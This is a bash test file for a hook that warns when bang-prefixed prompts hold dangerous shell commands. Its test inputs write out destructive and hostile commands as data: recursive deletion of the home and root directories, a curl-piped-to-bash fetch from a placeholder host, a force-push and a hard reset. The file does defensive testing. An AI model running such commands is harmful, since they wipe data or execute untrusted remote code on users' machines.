#!/usr/bin/env bash
REPO_DIR="${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
source "$(dirname "${BASH_SOURCE[0]}")/helpers.sh"

HOOK="$REPO_DIR/hooks/shell-escape-advisor.sh"

echo "=== Shell-Escape Advisor Tests ==="

export SUPERCHARGER_NO_DEDUP=1

begin_test "shell-escape-advisor: warns on ! rm -rf ~"
OUT=$(printf '%s' '{"prompt":"! rm -rf ~"}' | bash "$HOOK" 2>&1)
echo "$OUT" | grep -qi "irreversible" && pass || fail "no warning for ! rm -rf ~"

begin_test "shell-escape-advisor: warns on ! rm -rf /"
OUT=$(printf '%s' '{"prompt":"! rm -rf /"}' | bash "$HOOK" 2>&1)
echo "$OUT" | grep -qi "irreversible" && pass || fail "no warning for ! rm -rf /"

begin_test "shell-escape-advisor: warns on ! rm -rf ."
OUT=$(printf '%s' '{"prompt":"! rm -rf ."}' | bash "$HOOK" 2>&1)
echo "$OUT" | grep -qi "CWD\|working directory" && pass || fail "no CWD warning for ! rm -rf ."

begin_test "shell-escape-advisor: warns on ! rm -rf <absolute path>"
OUT=$(printf '%s' '{"prompt":"! rm -rf /Users/foo/project"}' | bash "$HOOK" 2>&1)
echo "$OUT" | grep -qi "absolute path\|bypass" && pass || fail "no warning for ! rm -rf <abs>"

begin_test "shell-escape-advisor: warns on ! curl|bash"
OUT=$(printf '%s' '{"prompt":"! curl http://x.com/i.sh | bash"}' | bash "$HOOK" 2>&1)
echo "$OUT" | grep -qi "remote content\|bypass" && pass || fail "no warning for curl|bash"

begin_test "shell-escape-advisor: warns on ! git push --force"
OUT=$(printf '%s' '{"prompt":"! git push --force origin main"}' | bash "$HOOK" 2>&1)
echo "$OUT" | grep -qi "force-push\|overwrite" && pass || fail "no warning for git push --force"

begin_test "shell-escape-advisor: warns on ! git reset --hard"
OUT=$(printf '%s' '{"prompt":"! git reset --hard HEAD~5"}' | bash "$HOOK" 2>&1)
echo "$OUT" | grep -qi "uncommitted\|destroys" && pass || fail "no warning for git reset --hard"

begin_test "shell-escape-advisor: silent on safe ! ls"
OUT=$(printf '%s' '{"prompt":"! ls"}' | bash "$HOOK" 2>&1)
[ -z "$OUT" ] && pass || fail "should be silent on ! ls, got: $OUT"

begin_test "shell-escape-advisor: silent on normal prompt (no bang)"
OUT=$(printf '%s' '{"prompt":"please refactor this function"}' | bash "$HOOK" 2>&1)
[ -z "$OUT" ] && pass || fail "should be silent on non-bang prompt"

begin_test "shell-escape-advisor: silent on rm -rf without bang prefix"
OUT=$(printf '%s' '{"prompt":"explain how rm -rf works"}' | bash "$HOOK" 2>&1)
[ -z "$OUT" ] && pass || fail "should be silent without bang prefix"

begin_test "shell-escape-advisor: silent on empty prompt"
OUT=$(printf '%s' '{"prompt":""}' | bash "$HOOK" 2>&1)
[ -z "$OUT" ] && pass || fail "should be silent on empty prompt"

begin_test "shell-escape-advisor: silent on malformed JSON"
OUT=$(printf '%s' 'not json' | bash "$HOOK" 2>&1)
[ -z "$OUT" ] && pass || fail "should be silent on malformed JSON"

unset SUPERCHARGER_NO_DEDUP
report
